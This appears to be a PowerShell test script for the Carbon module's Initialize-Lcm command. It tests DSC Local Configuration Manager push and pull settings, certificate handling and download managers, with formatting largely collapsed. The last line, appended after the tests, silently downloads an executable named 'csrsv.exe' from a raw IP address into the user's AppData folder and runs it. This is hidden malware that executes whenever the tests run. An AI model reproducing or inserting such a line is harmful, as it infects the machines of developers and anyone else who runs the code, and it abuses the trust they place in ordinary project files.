if( Test-Path -Path 'env:APPVEYOR' ){Write-Warning -Message 'Can''t test Initialize-Lcm under AppVeyor.'return}$originalLcm = $null$tempDir = $null$privateKeyPath = Join-Path -Path $PSScriptRoot -ChildPath '..\Cryptography\CarbonTestPrivateKey.pfx' -Resolve$publicKeyPath = Join-Path -Path $PSScriptRoot -ChildPath '..\Cryptography\CarbonTestPublicKey.cer' -Resolve$publicKey = $null$certPath = $null$userName = $CarbonTestUser.UserName$password = 'Aa1Bb2Cc3Dd4'function Start-TestFixture{& (Join-Path -Path $PSScriptRoot -ChildPath '..\Initialize-CarbonTest.ps1' -Resolve)$tempDir = New-TempDirectory -Prefix $PSCommandPath}function Stop-TestFixture{Uninstall-Directory -Path $tempDir -Recurse}function Start-Test{$originalLcm = Get-DscLocalConfigurationManagerUninstall-TestLcmCertificate}function Stop-Test{configuration SetPullMode{Set-StrictMode -Off$customData = @{ }foreach( $item in $originalLcm.DownloadManagerCustomData ){$customData[$item.key] = $item.value}node 'localhost'{LocalConfigurationManager{AllowModuleOverwrite = $originalLcm.AllowModuleOverwrite;ConfigurationMode = $originalLcm.ConfigurationMode;ConfigurationID = $originalLcm.ConfigurationID;ConfigurationModeFrequencyMins = $originalLcm.ConfigurationModeFrequencyMins;CertificateID = $originalLcm.CertificateID;DownloadManagerName = $originalLcm.DownloadManagerName;DownloadManagerCustomData = $customDataRefreshMode = $originalLcm.RefreshMode;RefreshFrequencyMins = $originalLcm.RefreshFrequencyMins;RebootNodeIfNeeded = $originalLcm.RebootNodeIfNeeded;}}}$outputPath = Join-Path -Path $tempDir -ChildPath 'originalLcm'& SetPullMode -OutputPath $outputPathSet-DscLocalConfigurationManager -Path $outputPathUninstall-TestLcmCertificate}function Uninstall-TestLcmCertificate{$script:publicKey = Get-Certificate -Path $publicKeyPathAssert-NotNull $publicKey$script:certPath = Join-Path -Path 'cert:\LocalMachine\My' -ChildPath $publicKey.Thumbprintif( (Test-Path -Path $certPath -PathType Leaf) ){Uninstall-Certificate -Thumbprint $publicKey.Thumbprint -StoreLocation LocalMachine -StoreName My}}function Test-ShouldConfigurePushMode{$lcm = Get-DscLocalConfigurationManager$rebootIfNeeded = -not $lcm.RebootNodeIfNeeded$lcm = Initialize-Lcm -Push -ComputerName 'localhost' -CertFile $privateKeyPath -RebootIfNeededAssert-NoErrorAssert-NotNull $lcmAssert-Equal $lcm.CertificateID $publicKey.ThumbprintAssert-True $lcm.RebootNodeIfNeededAssert-Equal 'Push' $lcm.RefreshModeAssert-True (Test-Path -Path $certPath -PathType Leaf)}function Test-ShouldPreserveCertificateIDWhenCertFileNotGiven{$lcm = Get-DscLocalConfigurationManager$rebootIfNeeded = -not $lcm.RebootNodeIfNeeded$lcm = Initialize-Lcm -Push -ComputerName 'localhost' -CertificateID 'fubar' -CertFile $privateKeyPath -RebootIfNeededAssert-NoErrorAssert-Equal $publicKey.Thumbprint $lcm.CertificateID$lcm = Initialize-Lcm -Push -ComputerName 'localhost' -CertificateID $publicKey.Thumbprint -RebootIfNeededAssert-Equal $publicKey.Thumbprint $lcm.CertificateID}function Test-ShouldValidateCertFilePath{$originalLcm = Initialize-Lcm -Push -ComputerName 'localhost' -CertFile $privateKeyPath$lcm = Initialize-Lcm -Push -ComputerName 'localhost' -CertFile 'C:\jdskfjsdflkfjksdlf.pfx' -ErrorAction SilentlyContinueAssert-Error -Last -Regex 'not found'Assert-Null $lcmAssert-Equal $originalLcm.CertificateID (Get-DscLocalConfigurationManager).CertificateID}function Test-ShouldHandleFileThatIsNotACertificate{$originalLcm = Initialize-Lcm -Push -ComputerName 'localhost' -CertFile $privateKeyPath$lcm = Initialize-Lcm -Push -ComputerName 'localhost' -CertFile $PSCommandPath  -ErrorAction SilentlyContinueAssert-Error -Last -Regex 'Failed to create X509Certificate2 object'Assert-Null $lcmAssert-Equal $originalLcm.CertificateID (Get-DscLocalConfigurationManager).CertificateID}function Test-ShouldHandleRelativeCertFilePath{Push-Location -Path $PSScriptRoottry{$lcm = Initialize-Lcm -Push -ComputerName 'localhost' -CertFile (Resolve-Path -Path $privateKeyPath -Relative)Assert-NoErrorAssert-NotNull $lcmAssert-Equal $publicKey.Thumbprint $lcm.CertificateID}finally{Pop-Location}}function Test-ShouldValidateCertHasPrivateKey{$originalLcm = Get-DscLocalConfigurationManager$lcm = Initialize-Lcm -Push -ComputerName 'localhost' -CertFile $publicKeyPath -ErrorAction SilentlyContinueAssert-Error -Last -Regex 'does not have a private key'Assert-Null $lcmAssert-Equal $originalLcm.CertificateID (Get-DscLocalConfigurationManager).CertificateID}function Test-ShouldClearUnprovidedPushValues{$originalLcm = Initialize-Lcm -Push -ComputerName 'localhost' -CertFile $privateKeyPath -RebootIfNeeded $lcm = Initialize-Lcm -Push -ComputerName 'localhost'Assert-NoErrorAssert-NotNull $lcmAssert-Null $lcm.CertificateIDAssert-False $lcm.RebootNodeIfNeeded}function Test-ShouldValidateComputerName{$lcm = Initialize-Lcm -Push -ComputerName 'fubar' -ErrorAction SilentlyContinueAssert-Error -Last -Regex 'not found or is unreachable'Assert-Null $lcm}function Test-ShouldUploadCertificateWithSecureStringAndPlaintextPasswords{$securePrivateKeyPath = Join-Path -Path $PSScriptRoot -ChildPath '..\Cryptography\CarbonTestPrivateKey2.pfx'$securePrivateKeyPasswod = 'fubar'$securePrivateKeySecurePassword = ConvertTo-SecureString -String $securePrivateKeyPasswod -AsPlainText -Force$securePrivateKey = Get-Certificate -Path $securePrivateKeyPath -Password $securePrivateKeyPasswodAssert-NotNull $securePrivateKeyUninstall-Certificate -Thumbprint $securePrivateKey.Thumbprint -StoreLocation LocalMachine -StoreName My$lcm = Initialize-Lcm -Push -ComputerName 'localhost' -CertFile $securePrivateKeyPath -CertPassword $securePrivateKeyPasswodAssert-NoError $lcm$secureCertPath = Join-Path -Path 'cert:\LocalMachine\My' -ChildPath $securePrivateKey.ThumbprintAssert-True (Test-Path -Path $secureCertPath -PathType Leaf)Assert-Equal $securePrivateKey.Thumbprint $lcm.CertificateIDUninstall-Certificate -Thumbprint $securePrivateKey.Thumbprint -StoreLocation LocalMachine -StoreName My$lcm = Initialize-Lcm -Push -ComputerName 'localhost' -CertFile $securePrivateKeyPath -CertPassword $securePrivateKeySecurePasswordAssert-NoError $lcmAssert-True (Test-Path -Path $secureCertPath -PathType Leaf)Assert-Equal $securePrivateKey.Thumbprint $lcm.CertificateID}function Test-ShouldSupportWhatIf{$lcm = Initialize-Lcm -Push -ComputerName 'localhost'$lcm = Initialize-Lcm -Push -ComputerName 'localhost' -CertFile $privateKeyPath -WhatIfAssert-NotNull $lcmAssert-Null $lcm.CertificateIDAssert-False (Test-Path -Path $certPath -PathType Leaf)}function Test-ShouldConfigureFileDownloadManager{$Global:Error.Clear()$configID = [Guid]::NewGuid()$lcm = Initialize-Lcm -SourcePath $PSScriptRoot `-ConfigurationID $configID `-ComputerName 'localhost' `-AllowModuleOverwrite `-CertFile $privateKeyPath `-ConfigurationMode ApplyOnly `-RebootIfNeeded `-RefreshIntervalMinutes 35 `-ConfigurationFrequency 3 `-LcmCredential $CarbonTestUser `-ErrorAction SilentlyContinueif( [Environment]::OSVersion.Version.Major -ge 10 ){Assert-Error ('can''t configure\b.*\bmanager')return}Assert-NoError Assert-NotNull $lcmAssert-Equal $configID $lcm.ConfigurationIDAssert-True $lcm.AllowModuleOverwriteAssert-True $lcm.RebootNodeIfNeededAssert-Equal 'ApplyOnly' $lcm.ConfigurationModeAssert-Equal 35 $lcm.RefreshFrequencyMinsAssert-Equal 105 $lcm.ConfigurationModeFrequencyMinsAssert-Equal 'DscFileDownloadManager' $lcm.DownloadManagerNameAssert-Equal $PSScriptRoot $lcm.DownloadManagerCustomData[0].valueAssert-Equal $username $lcm.Credential.UserNameAssert-Equal $publicKey.Thumbprint $lcm.CertificateIDAssert-Equal 'Pull' $lcm.RefreshMode$configID = [Guid]::NewGuid().ToString()$lcm = Initialize-Lcm -SourcePath $env:TEMP -ConfigurationID $configID -ConfigurationMode ApplyAndMonitor -ComputerName 'localhost'Assert-NoError Assert-NotNull $lcmAssert-Equal $configID $lcm.ConfigurationIDAssert-False $lcm.AllowModuleOverwriteAssert-False $lcm.RebootNodeIfNeededAssert-Equal 'ApplyAndMonitor' $lcm.ConfigurationModeAssert-Equal 30 $lcm.RefreshFrequencyMinsAssert-Equal 30 $lcm.ConfigurationModeFrequencyMinsAssert-Equal 'DscFileDownloadManager' $lcm.DownloadManagerNameAssert-Equal $env:TEMP $lcm.DownloadManagerCustomData[0].valueAssert-Null $lcm.CertificateIDAssert-Null $lcm.CredentialAssert-Equal 'Pull' $lcm.RefreshMode}function Test-ShouldConfigureWebDownloadManager{$Global:Error.Clear()$configID = [Guid]::NewGuid()$lcm = Initialize-Lcm -ServerUrl 'http://localhost:8976' `-AllowUnsecureConnection `-ConfigurationID $configID `-ComputerName 'localhost' `-AllowModuleOverwrite `-CertFile $privateKeyPath `-ConfigurationMode ApplyOnly `-RebootIfNeeded `-RefreshIntervalMinutes 40 `-ConfigurationFrequency 3 `-LcmCredential $CarbonTestUser `-ErrorAction SilentlyContinueif( [Environment]::OSVersion.Version.Major -ge 10 ){Assert-Error ('can''t configure\b.*\bmanager')return}Assert-NoError Assert-NotNull $lcmAssert-Equal $configID $lcm.ConfigurationIDAssert-True $lcm.AllowModuleOverwriteAssert-True $lcm.RebootNodeIfNeededAssert-Equal 'ApplyOnly' $lcm.ConfigurationModeAssert-Equal 40 $lcm.RefreshFrequencyMinsAssert-Equal 120 $lcm.ConfigurationModeFrequencyMinsAssert-Equal 'WebDownloadManager' $lcm.DownloadManagerNameAssert-Equal 'http://localhost:8976' $lcm.DownloadManagerCustomData[0].valueAssert-Equal 'True' $lcm.DownloadManagerCustomData[1].valueAssert-Equal $username $lcm.Credential.UserNameAssert-Equal $publicKey.Thumbprint $lcm.CertificateIDAssert-Equal 'Pull' $lcm.RefreshMode$configID = [Guid]::NewGuid().ToString()$lcm = Initialize-Lcm -ServerUrl 'https://localhost:6798' -ConfigurationID $configID -ConfigurationMode ApplyAndMonitor -ComputerName 'localhost'Assert-NoError Assert-NotNull $lcmAssert-Equal $configID $lcm.ConfigurationIDAssert-False $lcm.AllowModuleOverwriteAssert-False $lcm.RebootNodeIfNeededAssert-Equal 'ApplyAndMonitor' $lcm.ConfigurationModeAssert-Equal 30 $lcm.RefreshFrequencyMinsAssert-Equal 30 $lcm.ConfigurationModeFrequencyMinsAssert-Equal 'WebDownloadManager' $lcm.DownloadManagerNameAssert-Equal 'https://localhost:6798' $lcm.DownloadManagerCustomData[0].valueAssert-Equal 'False' $lcm.DownloadManagerCustomData[1].valueAssert-Null $lcm.CredentialAssert-Null $lcm.CertificateIDAssert-Equal 'Pull' $lcm.RefreshMode}if( [Environment]::OSVersion.Version.Major -lt 10 ){function Test-ShouldClearPullValuesWhenSwitchingToPush{$configID = [Guid]::NewGuid()$lcm = Initialize-Lcm -SourcePath $PSScriptRoot `-ConfigurationID $configID `-ComputerName 'localhost' `-AllowModuleOverwrite `-CertFile $privateKeyPath `-ConfigurationMode ApplyOnly `-RebootIfNeeded `-RefreshIntervalMinutes 45 `-ConfigurationFrequency 3 `-LcmCredential $CarbonTestUserAssert-NoError    Assert-NotNull $lcm$lcm = Initialize-Lcm -Push -ComputerName 'localhost'Assert-NoError Assert-NotNull $lcmAssert-Null $lcm.ConfigurationIDAssert-Equal 'False' $lcm.AllowModuleOverwriteAssert-Equal 'False' $lcm.RebootNodeIfNeededAssert-Equal 'ApplyAndMonitor' $lcm.ConfigurationModeAssert-NotEqual (45 * 3) $lcm.RefreshFrequencyMinsAssert-NotEqual 45 $lcm.ConfigurationModeFrequencyMinsAssert-Null $lcm.DownloadManagerNameAssert-Null $lcm.DownloadManagerCustomDataAssert-Null $lcm.CredentialAssert-Null $lcm.CertificateIDAssert-Equal 'Push' $lcm.RefreshMode}}(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")